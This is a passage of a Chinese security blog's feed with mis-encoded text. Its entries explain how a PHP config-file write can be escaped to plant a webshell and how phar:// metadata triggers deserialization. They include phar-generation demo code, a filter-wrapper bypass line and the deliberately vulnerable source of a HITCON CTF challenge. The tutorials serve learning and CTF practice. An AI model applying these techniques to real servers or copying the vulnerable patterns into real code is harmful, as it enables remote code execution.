    <summary type="html">
    
      
      
        &lt;h2 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h2&gt;&lt;p&gt;Discuzï¼ML æ˜¯ä¸€ä¸ªç”± CodersClub.org åˆ›å»ºçš„å¤šè¯­è¨€ï¼Œé›†æˆï¼ŒåŠŸèƒ½é½å…¨çš„å¼€æºç½‘ç»œå¹³å°ï¼Œç”¨äºæ„å»ºåƒ â€œç¤¾äº¤ç½‘ç»œâ€ è¿™æ ·çš„äº’è”
      
    
    </summary>
    
    
      <category term="æ¼æ´åˆ†æ" scheme="https://wywwzjj.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>PHP å†™å…¥é…ç½®æ–‡ä»¶ç»å…¸é—®é¢˜</title>
    <link href="https://wywwzjj.top/2019/07/11/PHP-%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%8F%E5%85%B8%E9%97%AE%E9%A2%98/"/>
    <id>https://wywwzjj.top/2019/07/11/PHP-å†™å…¥é…ç½®æ–‡ä»¶ç»å…¸é—®é¢˜/</id>
    <published>2019-07-11T01:36:48.000Z</published>
    <updated>2019-08-26T06:14:57.712Z</updated>
    
    <content type="html"><![CDATA[<p>ä»¥ä¸‹å†…å®¹æ˜¯å¯¹ wonderkun å¸ˆå‚…è¿™ç¯‡ <a href="https://blog.wonderkun.cc/2017/02/28/php%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">æ–‡ç« </a> çš„å­¦ä¹ ã€‚</p><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'option'</span>])) <span class="keyword">die</span>();</span><br><span class="line">$str = addslashes($_GET[<span class="string">'option'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./config.php'</span>); </span><br><span class="line">$file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./config.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>å†™å…¥ webshell éœ€è¦æ„é€  <code>&#39;</code> é—­åˆï¼Œè€Œ <code>&#39;</code> ç›´æ¥ä¼ å…¥å°†ä¼šè¢« <code>addslashes</code> è½¬ä¹‰ï¼Œçœ‹ä¼¼å®‰å…¨å®åˆ™ä¸ç„¶ã€‚</p><p>æœªå¯¹å†…å®¹è¿›è¡Œå¤„ç†ç›´æ¥å†™å…¥æ˜¯ä¸€ç§æå…¶å±é™©çš„åšæ³•ï¼Œé€šè¿‡ä¸€äº›å°æ‰‹æ³•å°±å¯ä»¥ä¸ºæ‰€æ¬²ä¸ºã€‚</p><h2 id="æ¢è¡Œç¬¦"><a href="#æ¢è¡Œç¬¦" class="headerlink" title="æ¢è¡Œç¬¦"></a>æ¢è¡Œç¬¦</h2><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vohoey00j20i202gweg.jpg" alt></p><p>æˆåŠŸå†™åˆ°ä¸‹ä¸€è¡Œï¼Œä½†<code>&#39;</code> è¿˜æ˜¯è¢«è½¬ä¹‰äº†ï¼Œé—®é¢˜ä¸å¤§ï¼Œå†æ›¿æ¢ä¸‹å°±è¡Œã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4voickhwej20hy02gdfr.jpg" alt></p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><p>æ­£å¸¸è½¬ä¹‰</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dofwyyudj20hb021q2v.jpg" alt></p><p>æˆåŠŸé€ƒé€¸</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dofc393wj20hd022q2u.jpg" alt></p><h2 id="åå‘å¼•ç”¨"><a href="#åå‘å¼•ç”¨" class="headerlink" title="åå‘å¼•ç”¨"></a>åå‘å¼•ç”¨</h2><p>è¿™æ€è·¯æ˜¯çœŸçš„ç‰›é€¼ï¼Œä¸‹é¢çš„ <code>replacement</code> å°±æ˜¯è¯´ç¬¬äºŒä¸ªå‚æ•°ã€‚</p><blockquote><p><code>replacement</code> ä¸­å¯ä»¥åŒ…å«åå‘å¼•ç”¨ <em>\n</em> æˆ– <em>$n</em>ï¼Œè¯­æ³•ä¸Šé¦–é€‰åè€…ã€‚ æ¯ä¸ª è¿™æ ·çš„å¼•ç”¨å°†è¢«åŒ¹é…åˆ°çš„ç¬¬ n ä¸ªæ•è·å­ç»„æ•è·åˆ°çš„æ–‡æœ¬æ›¿æ¢ã€‚ n å¯ä»¥æ˜¯ 0-99ï¼Œ<em>\0</em> å’Œ <em>$0</em> ä»£è¡¨å®Œæ•´çš„æ¨¡å¼åŒ¹é…æ–‡æœ¬ã€‚ æ•è·å­ç»„çš„åºå·è®¡æ•°æ–¹å¼ä¸ºï¼šä»£è¡¨æ•è·å­ç»„çš„å·¦æ‹¬å·ä»å·¦åˆ°å³ï¼Œ ä» 1 å¼€å§‹æ•°ã€‚</p></blockquote><p>æ„é€ ä¸€ä¸ª</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vqxix006j20gc025a9z.jpg" alt></p><p>å†æ¥ä¸€ä¸‹ï¼Œä½¿ç”¨ <code>$0</code> æˆ–è€… <code>\0</code>ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vqyanufnj20gb02b0sn.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä»¥ä¸‹å†…å®¹æ˜¯å¯¹ wonderkun å¸ˆå‚…è¿™ç¯‡ &lt;a href=&quot;https://blog.wonderkun.cc/2017/02/28/php%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7
      
    
    </summary>
    
    
      <category term="php" scheme="https://wywwzjj.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>phar ä¸ååºåˆ—åŒ–å­¦ä¹ </title>
    <link href="https://wywwzjj.top/2019/05/18/phar-%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wywwzjj.top/2019/05/18/phar-ä¸ååºåˆ—åŒ–å­¦ä¹ /</id>
    <published>2019-05-18T09:45:39.000Z</published>
    <updated>2019-09-11T08:46:59.004Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><h3 id="ä¸æ™®é€šååºåˆ—åŒ–åˆ©ç”¨æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#ä¸æ™®é€šååºåˆ—åŒ–åˆ©ç”¨æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="ä¸æ™®é€šååºåˆ—åŒ–åˆ©ç”¨æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>ä¸æ™®é€šååºåˆ—åŒ–åˆ©ç”¨æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h3><p>åœ¨ PHP ä¸‹åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´çš„æ—¶å€™ï¼Œé€šå¸¸èµ°è¿™æ ·çš„ä¸€æ¡è·¯çº¿ï¼š</p><p><strong>ååºåˆ—åŒ–ç‚¹ =&gt; å¯åˆ©ç”¨å‡½æ•° =&gt; æ„é€ ååºåˆ—åŒ– POP é“¾</strong></p><p>ä½†åœ¨ 2018 å¹´çš„ Black Hat ä¸Šï¼Œå®‰å…¨ç ”ç©¶å‘˜ Sam Thomas æŒ‡å‡ºäº†ä¸€æ¡æ–°æ€è·¯ï¼š</p><p>åœ¨<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</strong> ï¼ˆ file_get_contents ã€ unlink ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ <strong>phar:// ä¼ªåè®®</strong> ï¼Œå¯ä»¥ä¸ä¾èµ–ååºåˆ—åŒ–å‡½æ•° <code>unserialize()</code> ç›´æ¥è¿›è¡Œååºåˆ—åŒ–çš„æ“ä½œã€‚</p><h3 id="phar-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#phar-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="phar æ˜¯ä»€ä¹ˆï¼Ÿ"></a>phar æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p><a href="https://www.php.net/manual/en/phar.using.intro.php" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a> ç»™å‡ºäº†è¯¦ç»†çš„è§£é‡Šã€‚æ¦‚æ‹¬æ¥è¯´ï¼Œæœ‰å¦‚ä¸‹<strong>ç‰¹ç‚¹</strong>ï¼š</p><ul><li><p>Phar å­˜æ¡£åœ¨æ¦‚å¿µä¸Šç±»ä¼¼äº Java JAR å­˜æ¡£ï¼Œä½†æ˜¯æ ¹æ® PHP åº”ç”¨ç¨‹åºçš„éœ€æ±‚å’Œçµæ´»æ€§è¿›è¡Œäº†å®šåˆ¶ã€‚</p></li><li><p>Phar å¯ä»¥æŠŠå¤šä¸ªæ–‡ä»¶å½’æ¡£åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œä¸ç»è¿‡è§£å‹å°±èƒ½è¢« PHP è®¿é—®å¹¶æ‰§è¡Œã€‚</p></li><li><p>Meta-data can be any PHP variable that can be serialized.</p></li></ul><p>æœ€åä¸€ç‚¹å°¤å…¶é‡è¦ï¼Œæœ‰åºåˆ—åŒ–å°±æœ‰ååºåˆ—ã€‚</p><blockquote><p>This meta-data is unserialized when a Phar archive is first accessed by any(!) file operation. </p><p>This opens the door to unserialization attacks whenever a file operation occurs on a path whose<br>beginning is controlled by an attacker.</p></blockquote><p>å†çœ‹ä¸€ä¸‹ phar çš„<strong>æ–‡ä»¶ç»“æ„</strong>ã€‚</p><blockquote><p>The phar file format is literally laid out as stub / manifest / contents / signature, and stores the crucial information of what is included in the phar archive in its <em>manifest</em>.</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´åˆ†ä¸ºå››ä¸ªéƒ¨åˆ†ï¼š</p><ul><li><p>stub</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Phar::mapPhar();</span><br><span class="line"><span class="keyword">include</span> <span class="string">'phar://myphar.phar/index.php'</span>;</span><br><span class="line"><span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br></pre></td></tr></table></figure><p>  å¯ä»¥å½“åšä¸€ä¸ªæ ‡å¿—æ¥ç†è§£ï¼Œæ­£å¦‚ä¸Šé¢å†™çš„è¿™æ ·ï¼Œå¿…é¡»ä»¥ <code>_HALT_COMPILER();</code> ç»“å°¾ã€‚æ‰€ä»¥åœ¨è®¾ç½® <code>stub</code> æ—¶ï¼Œä¹Ÿè¦æœ‰ <code>__HALT_COMPILER();</code> ï¼Œè¿™é‡Œçš„è®¾ç½®å°±ç›¸å½“çµæ´»äº†ï¼Œä½ å¯ä»¥éšä¾¿æ’æ•°æ® ã€‚æ¯”å¦‚ï¼š</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx;<span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br><span class="line"><span class="comment">// éœ€è¦æé†’çš„æ˜¯ &lt;?php ?&gt; å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä»¥ ; éš”å¼€å³å¯ï¼Œå¯é¿å¼€æ£€æµ‹ &lt;? çš„æƒ…å†µ</span></span><br></pre></td></tr></table></figure></li><li><p>manifest</p><p>  phar æ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥<strong>åºåˆ—åŒ–</strong>çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„ meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚</p><p>  <img src="http://ww1.sinaimg.cn/large/de75fd55gy1g385zk9pc4j20np0a775m.jpg" alt></p></li><li><p>contentsï¼šè¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</p></li><li><p>signatureï¼šç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ã€‚</p></li></ul><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>ç”¨ä¸ªå° Demo æ¥æµ‹è¯•ä¸€ä¸‹ååºåˆ—åŒ–ï¼ˆæ³¨æ„è¦å°† php.ini ä¸­çš„ phar.readonly é€‰é¡¹è®¾ç½®ä¸º 0ï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// phar_gen.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct was called!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="string">"Off"</span>);</span><br><span class="line">    @unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);  <span class="comment">// åç¼€åå¿…é¡»ä¸ºpharï¼Œç”Ÿæˆåå¯éšæ„ä¿®æ”¹</span></span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">"2333;__HALT_COMPILER();"</span>);  <span class="comment">// è®¾ç½®stub</span></span><br><span class="line">    $p-&gt;setMetadata(<span class="keyword">new</span> Test());  <span class="comment">// å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span></span><br><span class="line">    $p-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);  <span class="comment">// æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">// ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° meta-data åœ¨ phar ä¸­çš„å­˜åœ¨å½¢å¼</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g386hud6grj20hj070jsn.jpg" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dese_phar.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct was called!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="string">'phar://test.phar/1'</span>;  <span class="comment">// è¿™é‡Œè®¿é—®çš„æ–‡ä»¶å­˜åœ¨ä¸å¦éƒ½ä¸é‡è¦</span></span><br><span class="line">    file_get_contents($filename);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ææ„å‡½æ•°è¢«æˆåŠŸè°ƒç”¨</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g386lyrg9aj20ki036mxg.jpg" alt></p><p>seaii å¸ˆå‚…ç»™å‡ºäº†å‡½æ•°åˆ—è¡¨</p><p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt></p><h2 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h2><p>è¿™é‡Œä¸å¾—ä¸æ orange åœ¨ hitcon 2017 å‡ºçš„ <code>baby^h-master-php-2017</code>ï¼Œæœ¬é¢˜å¯ä»¥é€šè¿‡ <a href="http://117.50.3.97:8005/" target="_blank" rel="noopener">i æ˜¥ç§‹å¹³å°å¤ç°</a>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$FLAG = create_function(<span class="string">""</span>, <span class="string">'die(`/read_flag`);'</span>);</span><br><span class="line">$SECRET = `/read_secret`;</span><br><span class="line">$SANDBOX = <span class="string">"/var/www/data/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">$data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">$hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET);</span><br><span class="line">setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $avatar;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;avatar = $path;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// çŒœæµ‹æ‰§è¡Œ FLAG() å‡º flag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span></span><br><span class="line">. <span class="string">"  global \$FLAG; \$FLAG();"</span></span><br><span class="line">. <span class="string">"&#125;"</span>);</span><br><span class="line"><span class="comment">// éš¾é“è¦çˆ†ç ´ï¼Ÿ</span></span><br><span class="line">$_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $SECRET;</span><br><span class="line">$data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line"><span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ååºåˆ—åŒ–ç‚¹ï¼Œä½†æ— æ³•æ›´æ”¹ session çš„å€¼</span></span><br><span class="line">$data = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($data-&gt;avatar)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $data-&gt;avatar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="comment">// vps å‡†å¤‡å¥½ phar æ–‡ä»¶</span></span><br><span class="line">$data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);</span><br><span class="line"><span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="comment">// è¿™ä¸¤ä¸ªå‡½æ•°éƒ½å°†é€ æˆååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123;</span><br><span class="line">$path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line"><span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>) &#123;</span><br><span class="line">upload(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>) &#123;</span><br><span class="line">show(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–è¿˜æœ‰ï¼š</p><ul><li><p>æŠ¤ç½‘æ¯ easy laravel</p></li><li><p>code-breaking lumenserial</p></li></ul><h2 id="ç›¸å…³ç»•è¿‡"><a href="#ç›¸å…³ç»•è¿‡" class="headerlink" title="ç›¸å…³ç»•è¿‡"></a>ç›¸å…³ç»•è¿‡</h2><p>TODO</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>æ¥çœ‹ä¸€ä¸‹æºç   <a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">php-src/ext/phar/phar.c:618</a>ï¼Œè°ƒç”¨äº† <code>php_var_unserialize</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)) &#123;</span><br></pre></td></tr></table></figure><p>å¤ªå¿™äº†ï¼Œæœ‰æ—¶é—´æ·±å…¥åˆ†æä¸€ä¸‹ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p><p><a href="https://blog.szfszf.top/tech/phar%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://blog.szfszf.top/tech/phar%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="http://www.lmxspace.com/2018/11/07/é‡æ–°è®¤è¯†ååºåˆ—åŒ–-Phar/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/11/07/é‡æ–°è®¤è¯†ååºåˆ—åŒ–-Phar/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h2&gt;&lt;h3 id=&quot;ä¸æ™®é€šååºåˆ—åŒ–åˆ©ç”¨æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ&quot;&gt;&lt;a href=&quot;#ä¸æ™®é€šååºåˆ—åŒ–åˆ©ç”¨æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Redis æœªæˆæƒè®¿é—®ç›¸å…³åˆ©ç”¨</title>
    <link href="https://wywwzjj.top/2019/05/17/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://wywwzjj.top/2019/05/17/Redis-æœªæˆæƒè®¿é—®ç›¸å…³åˆ©ç”¨/</id>
